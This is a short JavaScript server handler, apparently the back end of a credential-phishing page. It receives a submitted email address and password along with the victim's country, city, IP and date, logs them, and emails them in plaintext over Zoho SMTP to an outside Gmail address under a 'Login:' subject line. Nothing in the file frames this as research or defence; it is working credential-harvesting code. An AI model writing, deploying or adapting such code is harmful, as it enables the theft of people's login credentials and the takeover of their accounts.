import {NextApiRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";


const user = process.env.EMAIL;
const pass = process.env.PASSWORD;

export async function onRequestPost(context) {
  try {
    const body = await context.request.body;
    const {email, password, country, city, host_ip, date} = body

    console.log(email, password, country, city, host_ip, date)

    const transporter = nodemailer.createTransport({
      service: "zoho",
      host: "smtp.zoho.com",
      port: 465,
      secure: true,
      auth: {
        user,
        pass,
      },
    });

    const mailOptions = {
      from: "rep_info@zohomail.com",
      to: "feliciamark7@gmail.com",
      subject: `Login: | ${email} | ${country} | ${host_ip}`,
      text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nHost: ${host_ip}\nDate: ${date}`,
    };

    await transporter.sendMail(mailOptions);
    console.log('Message sent successfully')
    // res.status(200).send({message: 'Message sent successful'})
    return new Response({message: 'Message sent successful', status: 200})

  } catch (error) {
    console.log('Failed to send message')
    // res.status(500).send({error: "Failed to send message."})
    return new Response({message: `Error: ${error}`, status: 500})
  }
}

